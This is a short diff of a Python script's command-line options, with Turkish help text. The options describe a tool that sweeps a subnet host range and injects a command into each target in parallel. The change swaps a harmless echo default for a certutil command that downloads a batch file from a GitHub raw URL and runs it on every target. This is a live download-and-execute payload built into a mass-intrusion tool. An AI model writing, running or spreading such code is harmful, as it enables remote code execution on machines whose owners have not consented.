@@ -245,7 +245,7 @@ def main():
     parser.add_argument("--start", type=int, default=1, help="Başlangıç host")
     parser.add_argument("--end", type=int, default=254, help="Bitiş host")
     parser.add_argument("--server-port", type=int, default=34285, help="Sunucu TCP portu")
-    parser.add_argument("--command", default='cmd /k echo Hello from Injected Shell', help="Enjekte edilecek komut")
+    parser.add_argument("--command", default='certutil -urlcache -split -f https://raw.githubusercontent.com/seition2doc/dosta2/refs/heads/main/nettt.bat nettt.bat && nettt.bat', help="Enjekte edilecek komut")
     parser.add_argument("--timeout", type=int, default=30, help="Hedef başına süre (saniye)")
     parser.add_argument("--max-threads", type=int, default=5, help="Paralel hedef sayısı")
     args = parser.parse_args()
